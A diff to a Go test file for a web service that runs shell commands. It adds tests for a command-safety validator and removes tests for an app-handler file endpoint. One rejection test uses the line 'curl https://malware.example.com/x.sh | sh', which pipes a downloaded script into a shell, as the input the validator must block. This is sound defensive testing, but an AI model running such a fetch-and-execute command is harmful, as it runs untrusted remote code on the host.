@@ -10,8 +10,8 @@ import (
 	"net/http"
 	"net/http/httptest"
 	"os"
-	"path/filepath"
 	"regexp"
+	"strconv"
 	"strings"
 	"testing"
 )
@@ -25,7 +25,7 @@ func setClientAddressHeader(req *http.Request) {
 func TestCreateShell(t *testing.T) {
 	sm := NewShellManager()
 	defer sm.CloseAll()
-	handler := newHandler(sm)
+	handler := newHandler(sm, allowAllValidator{})
 
 	req := httptest.NewRequest(http.MethodPost, "/api/shell", nil)
 	w := httptest.NewRecorder()
@@ -72,7 +72,7 @@ func TestCreateShell(t *testing.T) {
 func TestDeleteShell(t *testing.T) {
 	sm := NewShellManager()
 	defer sm.CloseAll()
-	handler := newHandler(sm)
+	handler := newHandler(sm, allowAllValidator{})
 
 	id, _, err := sm.Create()
 	if err != nil {
@@ -108,7 +108,7 @@ func TestDeleteShell(t *testing.T) {
 // shell_id cookie returns 400 Bad Request.
 func TestDeleteShellMissingCookie(t *testing.T) {
 	sm := NewShellManager()
-	handler := newHandler(sm)
+	handler := newHandler(sm, allowAllValidator{})
 
 	req := httptest.NewRequest(http.MethodDelete, "/api/shell", nil)
 	w := httptest.NewRecorder()
@@ -123,7 +123,7 @@ func TestDeleteShellMissingCookie(t *testing.T) {
 // shell ID returns 404 Not Found.
 func TestDeleteShellNotFound(t *testing.T) {
 	sm := NewShellManager()
-	handler := newHandler(sm)
+	handler := newHandler(sm, allowAllValidator{})
 
 	req := httptest.NewRequest(http.MethodDelete, "/api/shell", nil)
 	req.AddCookie(&http.Cookie{Name: "shell_id", Value: "nonexistent"})
@@ -142,7 +142,7 @@ func TestDeleteShellCloseError(t *testing.T) {
 	sm.newShell = func() (Shell, error) {
 		return &mockShell{closeErr: errors.New("close failed")}, nil
 	}
-	handler := newHandler(sm)
+	handler := newHandler(sm, allowAllValidator{})
 
 	id, _, err := sm.Create()
 	if err != nil {
@@ -159,12 +159,12 @@ func TestDeleteShellCloseError(t *testing.T) {
 	}
 }
 
-// TestExecuteWhitelisted verifies that POST /api/execute with a whitelisted command
-// streams SSE events for stdout and complete with exit code 0.
-func TestExecuteWhitelisted(t *testing.T) {
+// TestExecuteAccepted verifies that POST /api/execute with a command the
+// validator accepts streams SSE events for stdout and complete with exit code 0.
+func TestExecuteAccepted(t *testing.T) {
 	sm := NewShellManager()
 	defer sm.CloseAll()
-	handler := newHandler(sm)
+	handler := newHandler(sm, allowAllValidator{})
 
 	id, _, err := sm.Create()
 	if err != nil {
@@ -200,57 +200,94 @@ func TestExecuteWhitelisted(t *testing.T) {
 	}
 }
 
-// TestExecuteNonWhitelisted verifies that POST /api/execute with a
-// non-whitelisted command executes it.
-func TestExecuteNonWhitelisted(t *testing.T) {
+// executeWithValidator posts a command through a handler wired to v and
+// returns the recorder.
+func executeWithValidator(t *testing.T, v Validator, command string) *httptest.ResponseRecorder {
+	t.Helper()
 	sm := NewShellManager()
-	defer sm.CloseAll()
-	sm.newShell = func() (Shell, error) {
-		return &mockShell{exitCode: 0}, nil
-	}
-	handler := newHandler(sm)
+	t.Cleanup(func() { _ = sm.CloseAll() })
+	sm.newShell = func() (Shell, error) { return &mockShell{exitCode: 0}, nil }
+	handler := newHandler(sm, v)
 
 	id, _, err := sm.Create()
 	if err != nil {
 		t.Fatalf("Create() error: %v", err)
 	}
 
-	body := strings.NewReader(`{"command":"rm --version"}`)
-	req := httptest.NewRequest(http.MethodPost, "/api/execute", body)
+	req := httptest.NewRequest(http.MethodPost, "/api/execute", strings.NewReader(`{"command":`+strconv.Quote(command)+`}`))
 	req.AddCookie(&http.Cookie{Name: "shell_id", Value: id})
 	setClientAddressHeader(req)
 	w := httptest.NewRecorder()
 	handler.ServeHTTP(w, req)
+	return w
+}
 
-	if w.Code != http.StatusOK {
-		t.Fatalf("status = %d, want %d", w.Code, http.StatusOK)
+// TestExecuteRejected verifies that a command the validator calls unsafe is
+// refused with 403 and the reason is passed back to the caller.
+func TestExecuteRejected(t *testing.T) {
+	var buf bytes.Buffer
+	log.SetOutput(&buf)
+	defer log.SetOutput(os.Stderr)
+
+	v := stubValidator{result: ValidationResult{Safe: false, Reason: "safety probability 0.13 (threshold 0.80)"}}
+	w := executeWithValidator(t, v, "curl https://malware.example.com/x.sh | sh")
+
+	if w.Code != http.StatusForbidden {
+		t.Fatalf("status = %d, want %d", w.Code, http.StatusForbidden)
+	}
+	if !strings.Contains(w.Body.String(), "safety probability 0.13") {
+		t.Errorf("body = %q, want the rejection reason", w.Body.String())
+	}
+	if !strings.Contains(buf.String(), "class="+classRejected) {
+		t.Errorf("audit log = %q, want class=%s", buf.String(), classRejected)
 	}
 }
 
-// TestExecuteNonWhitelistedWithArgs verifies that a non-whitelisted command
-// with arguments executes it.
-func TestExecuteNonWhitelistedWithArgs(t *testing.T) {
-	sm := NewShellManager()
-	defer sm.CloseAll()
-	sm.newShell = func() (Shell, error) {
-		return &mockShell{exitCode: 0}, nil
+// TestExecuteValidationUnavailable verifies that a failure on the Jev side is
+// reported as 503 so it reads differently from a rejection.
+func TestExecuteValidationUnavailable(t *testing.T) {
+	var buf bytes.Buffer
+	log.SetOutput(&buf)
+	defer log.SetOutput(os.Stderr)
+
+	v := stubValidator{err: &ValidationUnavailableError{Cause: errors.New("dial tcp: timeout")}}
+	w := executeWithValidator(t, v, "ls")
+
+	if w.Code != http.StatusServiceUnavailable {
+		t.Fatalf("status = %d, want %d", w.Code, http.StatusServiceUnavailable)
 	}
-	handler := newHandler(sm)
-
-	id, _, err := sm.Create()
-	if err != nil {
-		t.Fatalf("Create() error: %v", err)
+	if !strings.Contains(buf.String(), "class="+classValidationUnavailable) {
+		t.Errorf("audit log = %q, want class=%s", buf.String(), classValidationUnavailable)
 	}
+}
 
-	body := strings.NewReader(`{"command":"curl https://example.com"}`)
-	req := httptest.NewRequest(http.MethodPost, "/api/execute", body)
-	req.AddCookie(&http.Cookie{Name: "shell_id", Value: id})
-	setClientAddressHeader(req)
-	w := httptest.NewRecorder()
-	handler.ServeHTTP(w, req)
+// TestExecuteValidationError verifies that a malformed verdict is refused with
+// 403: the runner could talk to Jev but could not trust the answer.
+func TestExecuteValidationError(t *testing.T) {
+	var buf bytes.Buffer
+	log.SetOutput(&buf)
+	defer log.SetOutput(os.Stderr)
 
-	if w.Code != http.StatusOK {
+	v := stubValidator{err: errors.New(`jev: response has no "safe" answer`)}
+	w := executeWithValidator(t, v, "ls")
+
+	if w.Code != http.StatusForbidden {
+		t.Fatalf("status = %d, want %d", w.Code, http.StatusForbidden)
+	}
+	if !strings.Contains(buf.String(), "class="+classValidationError) {
+		t.Errorf("audit log = %q, want class=%s", buf.String(), classValidationError)
+	}
+}
+
+// TestExecuteSubmitsTheCommandToTheValidator verifies that no command bypasses
+// the validator.
+func TestExecuteSubmitsTheCommandToTheValidator(t *testing.T) {
+	v := &recordingValidator{result: ValidationResult{Safe: true}}
+	if w := executeWithValidator(t, v, "pwd"); w.Code != http.StatusOK {
 		t.Fatalf("status = %d, want %d", w.Code, http.StatusOK)
+	}
+	if v.command != "pwd" {
+		t.Errorf("validated command = %q, want pwd", v.command)
 	}
 }
 
@@ -258,7 +295,7 @@ func TestExecuteNonWhitelistedWithArgs(t *testing.T) {
 // shell_id cookie returns 400 Bad Request.
 func TestExecuteMissingShellCookie(t *testing.T) {
 	sm := NewShellManager()
-	handler := newHandler(sm)
+	handler := newHandler(sm, allowAllValidator{})
 
 	body := strings.NewReader(`{"command":"ls"}`)
 	req := httptest.NewRequest(http.MethodPost, "/api/execute", body)
@@ -274,7 +311,7 @@ func TestExecuteMissingShellCookie(t *testing.T) {
 // shell ID returns 404 Not Found.
 func TestExecuteShellNotFound(t *testing.T) {
 	sm := NewShellManager()
-	handler := newHandler(sm)
+	handler := newHandler(sm, allowAllValidator{})
 
 	body := strings.NewReader(`{"command":"ls"}`)
 	req := httptest.NewRequest(http.MethodPost, "/api/execute", body)
@@ -292,7 +329,7 @@ func TestExecuteShellNotFound(t *testing.T) {
 func TestExecuteInvalidJSON(t *testing.T) {
 	sm := NewShellManager()
 	defer sm.CloseAll()
-	handler := newHandler(sm)
+	handler := newHandler(sm, allowAllValidator{})
 
 	id, _, err := sm.Create()
 	if err != nil {
@@ -316,7 +353,7 @@ func TestExecuteInvalidJSON(t *testing.T) {
 func TestExecuteEmptyCommand(t *testing.T) {
 	sm := NewShellManager()
 	defer sm.CloseAll()
-	handler := newHandler(sm)
+	handler := newHandler(sm, allowAllValidator{})
 
 	id, _, err := sm.Create()
 	if err != nil {
@@ -339,7 +376,7 @@ func TestExecuteEmptyCommand(t *testing.T) {
 // /api/shell return 405 Method Not Allowed.
 func TestShellMethodNotAllowed(t *testing.T) {
 	sm := NewShellManager()
-	handler := newHandler(sm)
+	handler := newHandler(sm, allowAllValidator{})
 
 	req := httptest.NewRequest(http.MethodGet, "/api/shell", nil)
 	w := httptest.NewRecorder()
@@ -354,7 +391,7 @@ func TestShellMethodNotAllowed(t *testing.T) {
 // /api/execute return 405 Method Not Allowed.
 func TestExecuteMethodNotAllowed(t *testing.T) {
 	sm := NewShellManager()
-	handler := newHandler(sm)
+	handler := newHandler(sm, allowAllValidator{})
 
 	req := httptest.NewRequest(http.MethodGet, "/api/execute", nil)
 	w := httptest.NewRecorder()
@@ -372,7 +409,7 @@ func TestCreateShellError(t *testing.T) {
 	sm.newShell = func() (Shell, error) {
 		return nil, errors.New("shell broken")
 	}
-	handler := newHandler(sm)
+	handler := newHandler(sm, allowAllValidator{})
 
 	req := httptest.NewRequest(http.MethodPost, "/api/shell", nil)
 	w := httptest.NewRecorder()
@@ -381,6 +418,38 @@ func TestCreateShellError(t *testing.T) {
 	if w.Code != http.StatusInternalServerError {
 		t.Fatalf("status = %d, want %d", w.Code, http.StatusInternalServerError)
 	}
+}
+
+// allowAllValidator accepts every command, so tests that are not about
+// validation can exercise the rest of the request path.
+type allowAllValidator struct{}
+
+// Validate always reports the command as safe.
+func (allowAllValidator) Validate(context.Context, string) (ValidationResult, error) {
+	return ValidationResult{Safe: true}, nil
+}
+
+// stubValidator returns a preconfigured verdict or error.
+type stubValidator struct {
+	result ValidationResult
+	err    error
+}
+
+// Validate returns the preconfigured verdict or error.
+func (s stubValidator) Validate(context.Context, string) (ValidationResult, error) {
+	return s.result, s.err
+}
+
+// recordingValidator captures the command it was asked about.
+type recordingValidator struct {
+	result  ValidationResult
+	command string
+}
+
+// Validate records the command and returns the preconfigured verdict.
+func (r *recordingValidator) Validate(_ context.Context, command string) (ValidationResult, error) {
+	r.command = command
+	return r.result, nil
 }
 
 // mockShell is a test double for the Shell interface that returns
@@ -411,7 +480,7 @@ func TestExecuteWhitelistedWithStderr(t *testing.T) {
 	sm.newShell = func() (Shell, error) {
 		return &mockShell{exitCode: 0, stderr: "warning: something"}, nil
 	}
-	handler := newHandler(sm)
+	handler := newHandler(sm, allowAllValidator{})
 
 	id, _, err := sm.Create()
 	if err != nil {
@@ -449,7 +518,7 @@ func TestExecuteWhitelistedNonZeroExit(t *testing.T) {
 	sm.newShell = func() (Shell, error) {
 		return &mockShell{exitCode: 2}, nil
 	}
-	handler := newHandler(sm)
+	handler := newHandler(sm, allowAllValidator{})
 
 	id, _, err := sm.Create()
 	if err != nil {
@@ -478,7 +547,7 @@ func TestExecuteWhitelistedWithExecError(t *testing.T) {
 	sm.newShell = func() (Shell, error) {
 		return &mockShell{exitCode: -1, err: errors.New("broken")}, nil
 	}
-	handler := newHandler(sm)
+	handler := newHandler(sm, allowAllValidator{})
 
 	id, _, err := sm.Create()
 	if err != nil {
@@ -497,9 +566,9 @@ func TestExecuteWhitelistedWithExecError(t *testing.T) {
 	}
 }
 
-// TestExecuteNonWhitelistedAuditLog verifies that executing a non-whitelisted
-// command logs the "unclassified" class and the command string to the audit log.
-func TestExecuteNonWhitelistedAuditLog(t *testing.T) {
+// TestExecuteAuditLog verifies that an accepted command is recorded with the
+// "accepted" class, the command string, and a millisecond timestamp.
+func TestExecuteAuditLog(t *testing.T) {
 	var buf bytes.Buffer
 	oldOutput := log.Writer()
 	log.SetOutput(&buf)
@@ -510,7 +579,7 @@ func TestExecuteNonWhitelistedAuditLog(t *testing.T) {
 	sm.newShell = func() (Shell, error) {
 		return &mockShell{exitCode: 0}, nil
 	}
-	handler := newHandler(sm)
+	handler := newHandler(sm, allowAllValidator{})
 
 	id, _, err := sm.Create()
 	if err != nil {
@@ -529,8 +598,8 @@ func TestExecuteNonWhitelistedAuditLog(t *testing.T) {
 	}
 
 	logOutput := buf.String()
-	if !strings.Contains(logOutput, "class=unclassified") {
-		t.Fatalf("expected audit log to contain class=unclassified, got:\n%s", logOutput)
+	if !strings.Contains(logOutput, "class="+classAccepted) {
+		t.Fatalf("expected audit log to contain class=%s, got:\n%s", classAccepted, logOutput)
 	}
 	if !strings.Contains(logOutput, `command="curl https://example.com"`) {
 		t.Fatalf("expected audit log to contain the command, got:\n%s", logOutput)
@@ -540,43 +609,10 @@ func TestExecuteNonWhitelistedAuditLog(t *testing.T) {
 	}
 }
 
-// TestExecuteNonWhitelistedSSE verifies that a non-whitelisted command
-// executes and returns SSE events.
-func TestExecuteNonWhitelistedSSE(t *testing.T) {
-	sm := NewShellManager()
-	defer sm.CloseAll()
-	sm.newShell = func() (Shell, error) {
-		return &mockShell{exitCode: 0}, nil
-	}
-	handler := newHandler(sm)
-
-	id, _, err := sm.Create()
-	if err != nil {
-		t.Fatalf("Create() error: %v", err)
-	}
-
-	body := strings.NewReader(`{"command":"curl https://example.com"}`)
-	req := httptest.NewRequest(http.MethodPost, "/api/execute", body)
-	req.AddCookie(&http.Cookie{Name: "shell_id", Value: id})
-	setClientAddressHeader(req)
-	w := httptest.NewRecorder()
-	handler.ServeHTTP(w, req)
-
-	if w.Code != http.StatusOK {
-		t.Fatalf("status = %d, want %d", w.Code, http.StatusOK)
-	}
-
-	events := parseSSEEvents(t, w.Body.String())
-	last := events[len(events)-1]
-	if last.Type != "complete" || last.ExitCode == nil || *last.ExitCode != 0 {
-		t.Fatalf("expected complete with exitCode=0, got %+v", last)
-	}
-}
-
 // TestHealth verifies that GET /health returns 200 OK with body "ok\n".
 func TestHealth(t *testing.T) {
 	sm := NewShellManager()
-	handler := newHandler(sm)
+	handler := newHandler(sm, allowAllValidator{})
 
 	req := httptest.NewRequest(http.MethodGet, "/health", nil)
 	w := httptest.NewRecorder()
@@ -601,7 +637,7 @@ func TestExecuteClientAddressHeader(t *testing.T) {
 	sm.newShell = func() (Shell, error) {
 		return &mockShell{exitCode: 0}, nil
 	}
-	handler := newHandler(sm)
+	handler := newHandler(sm, allowAllValidator{})
 
 	id, _, err := sm.Create()
 	if err != nil {
@@ -642,7 +678,7 @@ func TestExecuteIPv6ClientAddressHeader(t *testing.T) {
 	sm.newShell = func() (Shell, error) {
 		return &mockShell{exitCode: 0}, nil
 	}
-	handler := newHandler(sm)
+	handler := newHandler(sm, allowAllValidator{})
 
 	id, _, err := sm.Create()
 	if err != nil {
@@ -677,7 +713,7 @@ func TestExecuteUnbracketedIPv6ClientAddressHeader(t *testing.T) {
 	sm.newShell = func() (Shell, error) {
 		return &mockShell{exitCode: 0}, nil
 	}
-	handler := newHandler(sm)
+	handler := newHandler(sm, allowAllValidator{})
 
 	id, _, err := sm.Create()
 	if err != nil {
@@ -707,7 +743,7 @@ func TestExecuteMissingClientAddressHeader(t *testing.T) {
 	sm.newShell = func() (Shell, error) {
 		return &mockShell{exitCode: 0}, nil
 	}
-	handler := newHandler(sm)
+	handler := newHandler(sm, allowAllValidator{})
 
 	id, _, err := sm.Create()
 	if err != nil {
@@ -734,7 +770,7 @@ func TestExecuteInvalidClientAddressHeader(t *testing.T) {
 	sm.newShell = func() (Shell, error) {
 		return &mockShell{exitCode: 0}, nil
 	}
-	handler := newHandler(sm)
+	handler := newHandler(sm, allowAllValidator{})
 
 	id, _, err := sm.Create()
 	if err != nil {
@@ -769,267 +805,6 @@ func TestParseClientAddressRejectsInvalidPorts(t *testing.T) {
 				t.Fatalf("parseClientAddress(%q) error = %v, want %q", value, err, errInvalidClientAddressHeader)
 			}
 		})
-	}
-}
-
-// setHandlerAppFilePath points handlerAppFilePath at path for the test and
-// restores the original when the test ends.
-func setHandlerAppFilePath(t *testing.T, path string) {
-	t.Helper()
-	orig := handlerAppFilePath
-	handlerAppFilePath = path
-	t.Cleanup(func() { handlerAppFilePath = orig })
-}
-
-// setHandlerAppMaxSize lowers handlerAppMaxSize for the test and restores the
-// original when the test ends.
-func setHandlerAppMaxSize(t *testing.T, size int64) {
-	t.Helper()
-	orig := handlerAppMaxSize
-	handlerAppMaxSize = size
-	t.Cleanup(func() { handlerAppMaxSize = orig })
-}
-
-func TestGetAppHandlerSuccess(t *testing.T) {
-	dir := t.TempDir()
-	path := filepath.Join(dir, "DaiKichijoji.pm")
-	want := "sub { return (200, 'text/plain', 'hi'); };\n"
-	if err := os.WriteFile(path, []byte(want), 0o644); err != nil {
-		t.Fatalf("WriteFile: %v", err)
-	}
-	setHandlerAppFilePath(t, path)
-
-	sm := NewShellManager()
-	defer sm.CloseAll()
-	handler := newHandler(sm)
-
-	req := httptest.NewRequest(http.MethodGet, "/api/app/handler", nil)
-	w := httptest.NewRecorder()
-	handler.ServeHTTP(w, req)
-
-	if w.Code != http.StatusOK {
-		t.Fatalf("status = %d, want %d", w.Code, http.StatusOK)
-	}
-	if got := w.Body.String(); got != want {
-		t.Errorf("body = %q, want %q", got, want)
-	}
-	if ct := w.Header().Get("Content-Type"); !strings.HasPrefix(ct, "text/plain") {
-		t.Errorf("Content-Type = %q, want text/plain*", ct)
-	}
-}
-
-func TestGetAppHandlerReadError(t *testing.T) {
-	setHandlerAppFilePath(t, filepath.Join(t.TempDir(), "does-not-exist.pl"))
-
-	sm := NewShellManager()
-	defer sm.CloseAll()
-	handler := newHandler(sm)
-
-	req := httptest.NewRequest(http.MethodGet, "/api/app/handler", nil)
-	w := httptest.NewRecorder()
-	handler.ServeHTTP(w, req)
-
-	if w.Code != http.StatusInternalServerError {
-		t.Fatalf("status = %d, want %d", w.Code, http.StatusInternalServerError)
-	}
-}
-
-func TestPutAppHandlerSuccess(t *testing.T) {
-	dir := t.TempDir()
-	path := filepath.Join(dir, "DaiKichijoji.pm")
-	if err := os.WriteFile(path, []byte("old\n"), 0o644); err != nil {
-		t.Fatalf("WriteFile: %v", err)
-	}
-	setHandlerAppFilePath(t, path)
-
-	sm := NewShellManager()
-	defer sm.CloseAll()
-	handler := newHandler(sm)
-
-	body := "sub { return (200, 'text/plain', 'new'); };\n"
-	req := httptest.NewRequest(http.MethodPut, "/api/app/handler", strings.NewReader(body))
-	setClientAddressHeader(req)
-	w := httptest.NewRecorder()
-	handler.ServeHTTP(w, req)
-
-	if w.Code != http.StatusNoContent {
-		t.Fatalf("status = %d, want %d", w.Code, http.StatusNoContent)
-	}
-	got, err := os.ReadFile(path)
-	if err != nil {
-		t.Fatalf("ReadFile: %v", err)
-	}
-	if string(got) != body {
-		t.Errorf("file = %q, want %q", got, body)
-	}
-
-	// GET after PUT returns the new body.
-	getReq := httptest.NewRequest(http.MethodGet, "/api/app/handler", nil)
-	getW := httptest.NewRecorder()
-	handler.ServeHTTP(getW, getReq)
-	if got := getW.Body.String(); got != body {
-		t.Errorf("GET body = %q, want %q", got, body)
-	}
-}
-
-// TestPutAppHandlerAuditLog verifies the audit log includes the written content.
-func TestPutAppHandlerAuditLog(t *testing.T) {
-	dir := t.TempDir()
-	path := filepath.Join(dir, "DaiKichijoji.pm")
-	setHandlerAppFilePath(t, path)
-
-	var buf bytes.Buffer
-	oldOutput := log.Writer()
-	log.SetOutput(&buf)
-	t.Cleanup(func() { log.SetOutput(oldOutput) })
-
-	sm := NewShellManager()
-	defer sm.CloseAll()
-	handler := newHandler(sm)
-
-	body := "package DaiKichijoji;\nsub content { return 'hi' }\n1;\n"
-	req := httptest.NewRequest(http.MethodPut, "/api/app/handler", strings.NewReader(body))
-	setClientAddressHeader(req)
-	w := httptest.NewRecorder()
-	handler.ServeHTTP(w, req)
-
-	if w.Code != http.StatusNoContent {
-		t.Fatalf("status = %d, want %d", w.Code, http.StatusNoContent)
-	}
-
-	logOutput := buf.String()
-	if !strings.Contains(logOutput, "class=handler-update") {
-		t.Fatalf("expected audit log to contain class=handler-update, got:\n%s", logOutput)
-	}
-	if !strings.Contains(logOutput, `command="package DaiKichijoji;\nsub content { return 'hi' }\n1;\n"`) {
-		t.Fatalf("expected audit log to contain the full written content, got:\n%s", logOutput)
-	}
-}
-
-func TestPutAppHandlerMissingClientAddress(t *testing.T) {
-	sm := NewShellManager()
-	defer sm.CloseAll()
-	handler := newHandler(sm)
-
-	req := httptest.NewRequest(http.MethodPut, "/api/app/handler", strings.NewReader("x"))
-	w := httptest.NewRecorder()
-	handler.ServeHTTP(w, req)
-
-	if w.Code != http.StatusBadRequest {
-		t.Fatalf("status = %d, want %d", w.Code, http.StatusBadRequest)
-	}
-	if !strings.Contains(w.Body.String(), errMissingClientAddressHeader) {
-		t.Errorf("body = %q, want error containing %q", w.Body.String(), errMissingClientAddressHeader)
-	}
-}
-
-func TestPutAppHandlerBodyTooLarge(t *testing.T) {
-	setHandlerAppMaxSize(t, 4)
-	dir := t.TempDir()
-	setHandlerAppFilePath(t, filepath.Join(dir, "DaiKichijoji.pm"))
-
-	sm := NewShellManager()
-	defer sm.CloseAll()
-	handler := newHandler(sm)
-
-	req := httptest.NewRequest(http.MethodPut, "/api/app/handler", strings.NewReader("hello"))
-	setClientAddressHeader(req)
-	w := httptest.NewRecorder()
-	handler.ServeHTTP(w, req)
-
-	if w.Code != http.StatusBadRequest {
-		t.Fatalf("status = %d, want %d", w.Code, http.StatusBadRequest)
-	}
-	if !strings.Contains(w.Body.String(), "read body") {
-		t.Errorf("body = %q, want error containing 'read body'", w.Body.String())
-	}
-	if _, err := os.Stat(filepath.Join(dir, "DaiKichijoji.pm")); err == nil {
-		t.Error("DaiKichijoji.pm should not be written on oversized body")
-	}
-}
-
-// TestPutAppHandlerBodyTooLargePreservesExistingFile verifies that a PUT
-// rejected for exceeding handlerAppMaxSize leaves an existing
-// DaiKichijoji.pm untouched.
-func TestPutAppHandlerBodyTooLargePreservesExistingFile(t *testing.T) {
-	setHandlerAppMaxSize(t, 4)
-	dir := t.TempDir()
-	path := filepath.Join(dir, "DaiKichijoji.pm")
-	old := "package DaiKichijoji;\nsub content { return 'old' }\n1;\n"
-	if err := os.WriteFile(path, []byte(old), 0o644); err != nil {
-		t.Fatalf("WriteFile: %v", err)
-	}
-	setHandlerAppFilePath(t, path)
-
-	sm := NewShellManager()
-	defer sm.CloseAll()
-	handler := newHandler(sm)
-
-	req := httptest.NewRequest(http.MethodPut, "/api/app/handler", strings.NewReader("way too much content"))
-	setClientAddressHeader(req)
-	w := httptest.NewRecorder()
-	handler.ServeHTTP(w, req)
-
-	if w.Code != http.StatusBadRequest {
-		t.Fatalf("status = %d, want %d", w.Code, http.StatusBadRequest)
-	}
-	got, err := os.ReadFile(path)
-	if err != nil {
-		t.Fatalf("ReadFile: %v", err)
-	}
-	if string(got) != old {
-		t.Errorf("file = %q, want unchanged %q", got, old)
-	}
-}
-
-func TestPutAppHandlerWriteError(t *testing.T) {
-	setHandlerAppFilePath(t, filepath.Join(t.TempDir(), "no-such-parent", "DaiKichijoji.pm"))
-
-	sm := NewShellManager()
-	defer sm.CloseAll()
-	handler := newHandler(sm)
-
-	req := httptest.NewRequest(http.MethodPut, "/api/app/handler", strings.NewReader("body"))
-	setClientAddressHeader(req)
-	w := httptest.NewRecorder()
-	handler.ServeHTTP(w, req)
-
-	if w.Code != http.StatusInternalServerError {
-		t.Fatalf("status = %d, want %d", w.Code, http.StatusInternalServerError)
-	}
-}
-
-func TestPutAppHandlerRenameError(t *testing.T) {
-	dir := t.TempDir()
-	// Point handlerAppFilePath at a directory; rename over a directory fails.
-	target := filepath.Join(dir, "DaiKichijoji.pm")
-	if err := os.Mkdir(target, 0o755); err != nil {
-		t.Fatalf("Mkdir: %v", err)
-	}
-	if err := os.WriteFile(filepath.Join(target, "child"), []byte("x"), 0o644); err != nil {
-		t.Fatalf("WriteFile: %v", err)
-	}
-	setHandlerAppFilePath(t, target)
-
-	sm := NewShellManager()
-	defer sm.CloseAll()
-	handler := newHandler(sm)
-
-	req := httptest.NewRequest(http.MethodPut, "/api/app/handler", strings.NewReader("body"))
-	setClientAddressHeader(req)
-	w := httptest.NewRecorder()
-	handler.ServeHTTP(w, req)
-
-	if w.Code != http.StatusInternalServerError {
-		t.Fatalf("status = %d, want %d", w.Code, http.StatusInternalServerError)
-	}
-	// tmp cleanup: os.CreateTempが作った".DaiKichijoji.pm.*.tmp"はrename失敗時に削除される。
-	matches, err := filepath.Glob(filepath.Join(dir, ".DaiKichijoji.pm.*.tmp"))
-	if err != nil {
-		t.Fatalf("Glob: %v", err)
-	}
-	if len(matches) > 0 {
-		t.Errorf("tmp files should be cleaned up after rename failure, found: %v", matches)
 	}
 }
 
